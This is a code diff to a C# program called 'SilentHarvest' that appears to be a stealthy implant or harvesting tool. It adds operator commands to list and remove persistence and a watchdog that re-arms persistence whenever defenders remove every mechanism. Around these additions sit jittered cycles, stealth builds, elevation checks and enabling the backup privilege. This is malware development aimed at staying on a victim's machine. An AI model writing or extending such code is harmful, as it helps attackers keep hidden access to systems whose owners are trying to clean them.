@@ -54,6 +54,18 @@ namespace SilentHarvest
                 else if (a == "--jitter" && i + 1 < argv.Length) jitterSec = int.Parse(argv[++i]);
                 else if (a == "--cycles" && i + 1 < argv.Length) cycles = int.Parse(argv[++i]);
                 else if (a == "--persist") persist = true;
+                else if (a == "--persist-list")
+                {
+                    // explicit operator command: visible even in stealth builds
+                    Console.WriteLine("persistence: {0} (staged: {1})",
+                        Stages.CheckPersistence(pname), Stages.StagedPath(pname));
+                    return 0;
+                }
+                else if (a == "--persist-remove")
+                {
+                    Console.WriteLine("{0}", Stages.RemovePersistence(pname));
+                    return 0;
+                }
                 else if (a == "--pname" && i + 1 < argv.Length) pname = argv[++i];
                 else if (a == "--wait" && i + 1 < argv.Length)
                 {
@@ -100,6 +112,18 @@ namespace SilentHarvest
             {
             cycle++;
             if (cycles > 0 && cycle > cycles) break;
+
+            // persistence watchdog: re-arm if every mechanism was removed
+            // (also the path that makes a tasked persist:true finally take
+            // effect -- previously the flag was set after the install block)
+            if (persist && cycle % 10 == 1
+                && Stages.CheckPersistence(pname) == "none")
+            {
+                string prr = Stages.PersistStage(pname,
+                    loopSec > 0 ? loopSec : 300,
+                    jitterSec > 0 ? jitterSec : 60);
+                Util.Log("persist re-armed: {0}", prr);
+            }
 
             bool elevated = Stages.IsElevated();
             bool backup = Stages.EnableBackupPrivilege();
